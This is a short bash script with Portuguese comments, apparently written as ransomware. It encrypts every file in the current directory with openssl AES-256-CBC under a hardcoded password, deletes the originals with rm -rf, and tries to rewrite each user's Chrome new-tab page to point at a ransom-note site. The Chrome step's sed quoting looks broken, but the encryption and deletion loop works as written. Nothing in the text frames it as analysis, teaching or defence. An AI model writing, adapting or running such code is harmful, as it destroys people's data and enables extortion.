#!/bin/bash

#Defina a senha do ransomware
pass="A_PASSWORD_HERE"

#Encripta os arquivos usando AES-256-CBC 
for file in *;
do
    if [ "$file" == "ransomware.sh" ];
    then 
        continue
    fi
    openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.lock" -k $pass
    rm -rf "$file"
done

#Muda a página inicial do Google Chrome
for user in $(ls /home);
do
    if [ "$user" == "all" ];
    then
        continue
    fi
    sed -i 's:"chrome_url_overrides": {"new_tab": "https://ransom-note.site.com/" }:" /home/$user/.config/google-chrome/Default/Preferences
done
